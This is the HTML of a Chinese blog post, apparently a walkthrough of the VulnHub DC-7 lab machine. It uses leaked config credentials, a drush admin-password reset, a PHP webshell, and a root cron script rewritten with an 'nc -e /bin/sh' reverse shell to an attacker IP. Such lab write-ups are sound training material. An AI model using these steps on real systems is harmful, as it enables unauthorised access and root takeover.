@@ -1,0 +1,226 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>vulnhub-DC-7 | Six_plum</title><meta name="author" content="Six_plum"><meta name="copyright" content="Six_plum"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="vulnhub-DC-7信息收集nmap扫描，忘截图了，是一个80端口和22端口，指纹识别到cms是drupal。然后就卡住了，看了别的师傅说留意署名，以及刚开始作者提到的跳出框框，那就去搜一搜署名@DC7USER，发现了github账号，里面有源码 用户密码泄露在config.php中拿到了用户名和密码 1234567&lt;?php	$servername &#x3D; &quot;localhost&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-DC-7">
+<meta property="og:url" content="https://hshdgyq.github.io/2024/11/21/vulnhub-DC-7/index.html">
+<meta property="og:site_name" content="Six_plum">
+<meta property="og:description" content="vulnhub-DC-7信息收集nmap扫描，忘截图了，是一个80端口和22端口，指纹识别到cms是drupal。然后就卡住了，看了别的师傅说留意署名，以及刚开始作者提到的跳出框框，那就去搜一搜署名@DC7USER，发现了github账号，里面有源码 用户密码泄露在config.php中拿到了用户名和密码 1234567&lt;?php	$servername &#x3D; &quot;localhost&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hshdgyq.github.io/img/background.jpg">
+<meta property="article:published_time" content="2024-11-21T13:16:12.000Z">
+<meta property="article:modified_time" content="2024-11-21T13:32:45.900Z">
+<meta property="article:author" content="Six_plum">
+<meta property="article:tag" content="vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hshdgyq.github.io/img/background.jpg"><link rel="shortcut icon" href="/img/upper.jpg"><link rel="canonical" href="https://hshdgyq.github.io/2024/11/21/vulnhub-DC-7/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'vulnhub-DC-7',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-21 21:32:45'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/header.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Six_plum</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">vulnhub-DC-7</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-21T13:16:12.000Z" title="发表于 2024-11-21 21:16:12">2024-11-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-21T13:32:45.900Z" title="更新于 2024-11-21 21:32:45">2024-11-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="vulnhub-DC-7"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="vulnhub-DC-7"><a href="#vulnhub-DC-7" class="headerlink" title="vulnhub-DC-7"></a>vulnhub-DC-7</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描，忘截图了，是一个80端口和22端口，指纹识别到cms是drupal。然后就卡住了，看了别的师傅说留意署名，以及刚开始作者提到的跳出框框，那就去搜一搜署名@DC7USER，发现了github账号，里面有源码</p>
+<h2 id="用户密码泄露"><a href="#用户密码泄露" class="headerlink" title="用户密码泄露"></a>用户密码泄露</h2><p>在config.php中拿到了用户名和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$servername = &quot;localhost&quot;;</span><br><span class="line">	$username = &quot;dc7user&quot;;</span><br><span class="line">	$password = &quot;MdR3xOgB7#dW&quot;;</span><br><span class="line">	$dbname = &quot;Staff&quot;;</span><br><span class="line">	$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>登录不了，试试ssh可以登录</p>
+<h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><p>登录提示有邮件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:/var/mail$ cat dc7user </span><br><span class="line">From root@dc-7 Thu Nov 21 17:15:45 2024</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 21 Nov 2024 17:15:45 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">     (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">     id 1tE1Pl-0000Ht-0t</span><br><span class="line">     for root@dc-7; Thu, 21 Nov 2024 17:15:45 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1tE1Pl-0000Ht-0t@dc-7&gt;</span><br><span class="line">Date: Thu, 21 Nov 2024 17:15:45 +1000</span><br><span class="line"></span><br><span class="line">rm: cannot remove &#x27;/home/dc7user/backups/*&#x27;: No such file or directory</span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br><span class="line">From root@dc-7 Thu Nov 21 17:30:14 2024</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Thu, 21 Nov 2024 17:30:14 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">     (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">     id 1tE1dm-0000IZ-DB</span><br><span class="line">     for root@dc-7; Thu, 21 Nov 2024 17:30:14 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL=/bin/sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME=/root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME=root&gt;</span><br><span class="line">Message-Id: &lt;E1tE1dm-0000IZ-DB@dc-7&gt;</span><br><span class="line">Date: Thu, 21 Nov 2024 17:30:14 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to /home/dc7user/backups/website.sql               [success]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>很明显的定时任务<code>Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</code>，去看看这个脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:/opt/scripts$ ls -l</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxr-x 1 root www-data 520 Aug 29  2019 backups.sh</span><br><span class="line"></span><br><span class="line">dc7user@dc-7:/opt/scripts$ cat backups.sh </span><br><span class="line">#!/bin/bash</span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line">cd /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现这个脚本只有root和www-data用户有执行和写权限，root用户是我们的终极目标，那么现在就是要得到www-data用户，在脚本中有drush对数据库的操作，那么我们也可以利用drush修改管理员密码,需要在html目录才能成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:/var/www/html$ drush user-password admin --password=&quot;123456&quot;</span><br><span class="line">Changed password for admin                                                                                                                                              [success]</span><br></pre></td></tr></table></figure>
+
+<p>登录网站，可以修改文章，但是drupal8不支持php解析，那么就需要安装插件</p>
+<p><img src="/2024/11/21/vulnhub-DC-7/2.png"></p>
+<p><img src="/2024/11/21/vulnhub-DC-7/3.png"></p>
+<p>安装后在文章中插入一句话木马，选择php code，就能getshell拿到ww-data权限</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>修改backups.sh内容，由于这是个定时任务，root会执行，那么只需要在其中反弹shell即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">nc -e /bin/sh 192.168.20.129 2222</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─# nc -lvvp 2222</span><br><span class="line">listening on [any] 2222 ...</span><br><span class="line">192.168.20.136: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.20.129] from (UNKNOWN) [192.168.20.136] 38288</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p>至此靶机攻克</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>此靶机涉及到了社工，根据署名拿到源码，其次较新的考点就是学会利用定时任务进行提权</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://hshdgyq.github.io">Six_plum</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://hshdgyq.github.io/2024/11/21/vulnhub-DC-7/">https://hshdgyq.github.io/2024/11/21/vulnhub-DC-7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://hshdgyq.github.io" target="_blank">Six_plum</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vulnhub/">vulnhub</a></div><div class="post_share"><div class="social-share" data-image="/img/background.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/11/21/vulnhub-DC-6/"><img class="next-cover" src="/img/background.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">vulnhub-DC-6</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/11/12/vulnhub-DC-1/" title="vulnhub-DC-1"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-12</div><div class="title">vulnhub-DC-1</div></div></a></div><div><a href="/2024/11/14/vulnhub-DC-3/" title="vulnhub-DC-3"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-14</div><div class="title">vulnhub-DC-3</div></div></a></div><div><a href="/2024/11/13/vulnhub-DC-2/" title="vulnhub-DC-2"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-13</div><div class="title">vulnhub-DC-2</div></div></a></div><div><a href="/2024/11/20/vulnhub-DC-4/" title="vulnhub-DC-4"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-20</div><div class="title">vulnhub-DC-4</div></div></a></div><div><a href="/2024/11/20/vulnhub-DC-5/" title="vulnhub-DC-5"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-20</div><div class="title">vulnhub-DC-5</div></div></a></div><div><a href="/2024/11/21/vulnhub-DC-6/" title="vulnhub-DC-6"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-21</div><div class="title">vulnhub-DC-6</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/header.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Six_plum</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/hshdgyq"><i class="fab fa-github"></i><span>github</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/hshdgyq" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1952023661@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">记录一些刷题日志，防止走丢。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub-DC-7"><span class="toc-number">1.</span> <span class="toc-text">vulnhub-DC-7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.</span> <span class="toc-text">用户密码泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.3.</span> <span class="toc-text">定时任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/21/vulnhub-DC-7/" title="vulnhub-DC-7"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub-DC-7"/></a><div class="content"><a class="title" href="/2024/11/21/vulnhub-DC-7/" title="vulnhub-DC-7">vulnhub-DC-7</a><time datetime="2024-11-21T13:16:12.000Z" title="发表于 2024-11-21 21:16:12">2024-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/21/vulnhub-DC-6/" title="vulnhub-DC-6"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub-DC-6"/></a><div class="content"><a class="title" href="/2024/11/21/vulnhub-DC-6/" title="vulnhub-DC-6">vulnhub-DC-6</a><time datetime="2024-11-21T04:27:57.000Z" title="发表于 2024-11-21 12:27:57">2024-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/20/vulnhub-DC-5/" title="vulnhub-DC-5"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub-DC-5"/></a><div class="content"><a class="title" href="/2024/11/20/vulnhub-DC-5/" title="vulnhub-DC-5">vulnhub-DC-5</a><time datetime="2024-11-20T13:04:36.000Z" title="发表于 2024-11-20 21:04:36">2024-11-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/20/vulnhub-DC-4/" title="vulnhub-DC-4"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub-DC-4"/></a><div class="content"><a class="title" href="/2024/11/20/vulnhub-DC-4/" title="vulnhub-DC-4">vulnhub-DC-4</a><time datetime="2024-11-20T09:49:17.000Z" title="发表于 2024-11-20 17:49:17">2024-11-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/14/vulnhub-DC-3/" title="vulnhub-DC-3"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub-DC-3"/></a><div class="content"><a class="title" href="/2024/11/14/vulnhub-DC-3/" title="vulnhub-DC-3">vulnhub-DC-3</a><time datetime="2024-11-14T12:23:01.000Z" title="发表于 2024-11-14 20:23:01">2024-11-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/background.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By Six_plum</div><div class="footer_custom_text">I wish you to become your own sun, no need to rely on who's light.</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"]):not([href="/music/"]):not([href="/no-pjax/"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- 樱花特效 启用时删去下面的<!即可-->
